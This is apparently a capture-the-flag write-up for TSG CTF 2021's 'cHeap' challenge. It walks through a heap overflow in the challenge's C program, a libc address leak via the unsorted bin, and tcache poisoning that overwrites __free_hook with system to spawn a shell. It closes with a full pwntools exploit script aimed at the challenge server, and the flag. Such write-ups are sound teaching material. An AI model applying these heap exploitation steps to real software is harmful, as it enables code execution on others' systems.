# Cheap

![](/2021/TSG-CTF/cHeap/images/1.png)

The chall give me source code, binary file, libc, makefile

## Checking the file

![](/2021/TSG-CTF/cHeap/images/2.png)

But it not much important because this is a heap challenge.

## Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void readn(char *buf, unsigned size) {
    unsigned cnt = 0;
    for (unsigned i = 0; i < size; i++) {
        unsigned x = read(0, buf + i, 1);
        cnt += x;
        if (x != 1 || buf[cnt - 1] == '\n') break;
    }
    if (cnt == 0) exit(-1);
    if (buf[cnt - 1] == '\n') buf[cnt - 1] = '\x00';
}

void init() {
    alarm(60);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

char *ptr = NULL;
void create() {
    unsigned size;
    printf("size: ");
    scanf("%u", &size);
    ptr = malloc(size);
    printf("data: ");
    readn(ptr, 0x100);
}

void show() {
    printf("%s\n", ptr);
}

void delete() {
    free(ptr);
}

int main(void) {
    init();
    int select = 0;
    while (1) {
        puts("1. create");
        puts("2. show");
        puts("3. remove");
        printf("Choice: ");
        scanf("%d", &select);
        if (select == 1) {
            create();
        } else if (select == 2) {
            show();
        } else if (select == 3) {
            delete();
        } else {
            exit(-1);
        }

    }
    return 0;
}
```

The program is easy to understand, i input 1->3, 1 is create, 2 is delete, 3 is show. 

![](/2021/TSG-CTF/cHeap/images/3.png)

Readn fucntion 

![](/2021/TSG-CTF/cHeap/images/4.png)

I have 1 char pointer is ptr, create() function will malloc arbitrary size i want, puts will show the content at ptr, and delete() will delete pointer. In create() after call alloc, readn() function will call to read the input(). And this is the bug, readn(ptr,0x100) always call what even the size of chunk is, so this is heap overflow.

In heap challenges, one simple way to solve is to leak libc, overwrite free_hook and get shell.

## Leak libc

First thing i need to do is leak libc_address. Because the version of libc is 2.31 so that have tcache. I need to free a chunk into unsorted bin to leak libc base. There is 2 simple way to do it, one is you free a chunk larger than 0x90 (out of fastbin) more than 7 times, or free 1 chunk larger than 0x410 (out of tcache).

Because i only have 1 pointer, second way may be more possible. I can malloc what size i want. But i can not just malloc (0x420) and free() it, because I need a chunk to seperated it with the top chunk when i free, if not, the chunk will merge with the top chunk and it not be in unsorted bin. If I do malloc (0x420) then malloc(0x10) after that, I can not go back to the 0x420 chunk to free it.

So I do it like this

![](/2021/TSG-CTF/cHeap/images/5.png)

I malloc and free 4 chunks with size 0xf0, 0x200, 0x400, 0x90. After that, I malloc(0xf0) to comeback to first chunk (due the use after free) and use the heap overflow to change the size of second chunk to 0x621 with is the total sum of the second and third chunk.

![](/2021/TSG-CTF/cHeap/images/6.png)

After that, I free it and malloc(0x200), with give me the pointer to the second chunk. And free it, when I free this time, because the size is changed, the size of chunk I free is no longer 0x211 but 0x621, note that i already have 0x90 chunk to seperated with the top chunk and because it > 0x410, they will be inserted to unsorted bin.

![](/2021/TSG-CTF/cHeap/images/7.png)

After free the yellow part, it will be inserted to unsorted bin and the FD and PK are fill with libc address, I malloc(0xf0) again to comback the first chunk and fill it with 0x100 charracter ‘A’, and call function show() to leak the address.

![](/2021/TSG-CTF/cHeap/images/8.png)

So I successfully leak libc address

```python
#Part 1: leak libc

# Create first chunk use for change size of second chunk
create(0xf0, b'\n')
delete()

# Create the second and third chunk with the total size > 0x410 to out of tcache
create(0x200, b'\n')
delete()

create(0x400, b'\n')
delete()

# create chunk to prevent it from top chunk
create(0x90, b'\n')
delete()

# comeback to first chunk due to tcache and edit size of second chunk to be the total size of second and third chunk
payload = b'A' * 0xf0 + p64(0) + p64(0x621) + b'\n'
create(0xf0, payload)
delete()

# now create a chunk 0x200 with give us address of second chunk (with new size, so we have a chunk size 0x620)
create(0x200, b'\n')
# free it and it now go to the unsorted bin
delete()

# use first chunk again to leak the libc at fd of unsorted bin
create(0xf0, b'A' * 0x100)
show()

s.recvuntil(b'A' * 0x100)

unsorted_bin_leak = int.from_bytes(s.recvline().strip(), byteorder = 'little', signed = False)

libc_base = unsorted_bin_leak - unsorted_bin
system = libc_base + system_offset
free_hook = libc_base + free_hook_offset

# delete and reuse again to re-edit the chunk size, because we crash it with 'A' in previous step, to not cause segment fault
delete()
payload = b'A' * 0xf0 + p64(0) + p64(0x621)
create(0xf0, payload)
```

## Overwrite free_hook and get shell

The next step is overwrite free_hook with address of system and get a shell. The list of chunks on the cache will be stored as a singly linked list. I'll overwrite it to make tcache allocate memory at the free_hook.

To do it, I need to free aleast 2 chunk with the same size to tcache, I will do the same way when leaking libc.

Just read the code, i explain really careful.

```python
# Part 2: overwrite free_hook and get shell
create(0x40, b'\n') #create and delete the first 0x50 size chunk
delete()
create(0x50, b'\n') #create a chunk for latter use (I will call this s_chunk)
delete()
create(0x20, b'\n') #create 2 chunk 0x30 and 0x20 with the total size is 0x50
delete()
create(0x10, b'\n')
delete()
create(0x30, b'\n')  # not necessary but just for fun LOL
payload = b'A' * 0x50 + p64(0) + p64(0x51) + b'\n'
create(0x50, payload) #comback to s_chunk and edit the size of third chunk
delete()
create(0x20, b'\n') #create chunk 0x30
delete() #after this, we free the second 0x50 size chunk
```

So we have 2 0x50 size chunk freed in tcache

## Last step, Overwrite the free_hook and get a shell

```python
payload = b'A' * 0x60 + p64(free_hook) + b'\n'
create(0x50, payload) 
# back to s_chunk and overwrite fd pointer of 0x50 chunk to free-hook
delete()
create(0x40, b'\n')
# create the first 0x50 chunk, after this, tcache take the fd pointer to allocate next
# 0x50 chunk, but I overwrite it to the free_hook, so next time allocate(0x50),
# it will give me a pointer to free_hook
create(0x40, p64(system) + b'\n') # write address system to free_hook
create(0x10, b'/bin/sh\n') #create a chunk with str “/bin/sh”
delete() # free it, the program will call system(“/bin/sh”)
```

## Final exploit 

File [solve.py](/2021/TSG-CTF/cHeap/solve.py)

```python
from pwn import *

#s = process('./cheap')
#raw_input('DEBUG')

s = remote('34.146.101.4', 30001)

unsorted_bin = 0x1ebbe0
system_offset = 0x55410
free_hook_offset = 0x1eeb28

def create(size, data):
	s.sendlineafter(b'Choice: ', b'1')
	s.sendlineafter(b'size: ', bytes(str(size), 'utf-8'))
	s.sendafter(b'data: ', data)

def delete():
	s.sendlineafter(b'Choice: ', b'3')

def show():
	s.sendlineafter(b'Choice: ', b'2')


#Part 1: leak libc

# Create first chunk use for change size of second chunk
create(0xf0, b'\n')
delete()

# Create the second and third chunk with the total size > 0x410 to out of tcache
create(0x200, b'\n')
delete()

create(0x400, b'\n')
delete()

# create chunk to prevent it from top chunk
create(0x90, b'\n')
delete()

# comeback to first chunk due to tcache and edit size of second chunk to be the total size of second and third chunk
payload = b'A' * 0xf0 + p64(0) + p64(0x621) + b'\n'
create(0xf0, payload)
delete()

# now create a chunk 0x200 with give us address of second chunk (with new size, so we have a chunk size 0x620)
create(0x200, b'\n')
# free it and it now go to the unsorted bin
delete()

# use first chunk again to leak the libc at fd of unsorted bin
create(0xf0, b'A' * 0x100)
show()

s.recvuntil(b'A' * 0x100)

unsorted_bin_leak = int.from_bytes(s.recvline().strip(), byteorder = 'little', signed = False)

libc_base = unsorted_bin_leak - unsorted_bin
system = libc_base + system_offset
free_hook = libc_base + free_hook_offset

# delete and reuse again to reedit the chunk size, because we crash it with 'A' in previous step, to not cause segment fault
delete()
payload = b'A' * 0xf0 + p64(0) + p64(0x621)
create(0xf0, payload)

# Part 2: overwrite free_hook and get shell
create(0x40, b'\n') #create and delete the first 0x50 size chunk
delete()

create(0x50, b'\n') #create a chunk for latter use (I will call this s_chunk)
delete()

create(0x20, b'\n') #create 2 chunk 0x30 and 0x20 with the total size is 0x50
delete()

create(0x10, b'\n')
delete()

create(0x30, b'\n')  # not necessary but just for fun LOL

payload = b'A' * 0x50 + p64(0) + p64(0x51) + b'\n'
create(0x50, payload) #comback to s_chunk and edit the size of third chunk
delete()

create(0x20, b'\n') #create chunk 0x30
delete() #after this, we free the second 0x50 size chunk


payload = b'A' * 0x60 + p64(free_hook) + b'\n'

create(0x50, payload) 
# back to s_chunk and overwrite fd pointer of 0x50 chunk to free-hook
delete()

create(0x40, b'\n')
# create the first 0x50 chunk, after this, tcache take the fd pointer to allocate next
# 0x50 chunk, but I overwrite it to the free_hook, so next time allocate(0x50),
# it will give me a pointer to free_hook

create(0x40, p64(system) + b'\n') # write address system to free_hook

create(0x10, b'/bin/sh\n') #create a chunk with str “/bin/sh”
delete() # free it, the program will call system(“/bin/sh”)

s.interactive()
```

`flag: TSGCTF{Heap_overflow_is_easy_and_nice_yeyey}`
